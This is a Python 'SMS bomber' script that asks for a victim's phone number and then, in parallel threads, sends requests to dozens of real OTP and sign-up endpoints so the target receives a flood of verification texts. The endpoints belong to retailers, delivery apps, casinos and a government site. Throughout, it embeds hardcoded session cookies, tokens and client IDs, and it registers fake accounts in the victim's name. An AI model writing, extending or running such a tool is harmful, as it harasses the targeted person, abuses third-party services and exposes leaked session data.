from os import system
import requests
import os
import time
import threading
from threading import Thread
os.system('mode con: cols=71     lines=32')

useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"


print("""

                      ██████  ███▄ ▄███▓  ██████ 
                    ▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒ 
                    ░ ▓██▄   ▓██    ▓██░░ ▓██▄   
                      ▒   ██▒▒██    ▒██   ▒   ██▒
                    ▒██████▒▒▒██▒   ░██▒▒██████▒▒
                    ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░
                    ░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░
                    ░  ░  ░  ░      ░   ░  ░  ░  
                      ░         ░         ░  
                             
                                                                   
""")
print("                 Spam sms ")
print("		          30 Api ")
print("")
phone = input("                        PhoneNumber : ")
amount = int(input("                             Amount : "))

def ctx(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
print("attack start.")

def ctx1():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})


def ctx2():
    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})


def ctx3():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")


def ctx4():
    requests.post("https://tamjaibet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})


def ctx5():
    requests.post("https://store.boots.co.th/api/v1/guest/register/otp-challenge",json={"phone_number": "+66"+phone})


def ctx6():
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":"phone","optType":0})


def ctx7():
    requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text


def ctx8():
    requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})

def ctx9():
    requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})

def ctx10():
    requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def ctx11():
    requests.post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ctx12():
    requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def ctx13():
    requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ctx14():
    requests.post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})


def ctx15():
    requests.post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})


def ctx16():
    requests.post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})


def ctx17():
    requests.post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})


def ctx18():
    requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})


def ctx19():
    requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})


def ctx20():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})


def ctx21():
    requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})


def ctx22():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})


def ctx23():
    requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})


def ctx24():
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})


def ctx25():
    requests.post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})


def ctx26():
   requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")


def ctx27():
    requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")


def ctx28():
    requests.post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})

def ctx29():
    requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})


def ctx30():
    requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ctx31(): 
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})

def ctx32():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")


def ctx33():
    requests.post("https://tamjaibet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})


def ctx34():
    requests.post("https://store.boots.co.th/api/v1/guest/register/otp-challenge",json={"phone_number": "+66"+phone})


def ctx35():
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":"phone","optType":0})
    print("attack ended.")

for i in range(amount):
    time.sleep(0.8)
threading.Thread(target=ctx).start()
threading.Thread(target=ctx1).start()
threading.Thread(target=ctx2).start()
threading.Thread(target=ctx3).start()
threading.Thread(target=ctx4).start()
threading.Thread(target=ctx5).start()
threading.Thread(target=ctx6).start()
threading.Thread(target=ctx7).start()
threading.Thread(target=ctx8).start()
threading.Thread(target=ctx9).start()
threading.Thread(target=ctx10).start()
threading.Thread(target=ctx11).start()
threading.Thread(target=ctx12).start()
threading.Thread(target=ctx13).start()
threading.Thread(target=ctx14).start()
threading.Thread(target=ctx15).start()
threading.Thread(target=ctx16).start()
threading.Thread(target=ctx17).start()
threading.Thread(target=ctx18).start()
threading.Thread(target=ctx19).start()
threading.Thread(target=ctx20).start()
threading.Thread(target=ctx21).start()
threading.Thread(target=ctx22).start()
threading.Thread(target=ctx23).start()
threading.Thread(target=ctx24).start()
threading.Thread(target=ctx25).start()
threading.Thread(target=ctx26).start()
threading.Thread(target=ctx27).start()
threading.Thread(target=ctx28).start()
threading.Thread(target=ctx29).start()
threading.Thread(target=ctx30).start()
threading.Thread(target=ctx31).start()
threading.Thread(target=ctx32).start()
threading.Thread(target=ctx33).start()
threading.Thread(target=ctx34).start()
threading.Thread(target=ctx35).start()

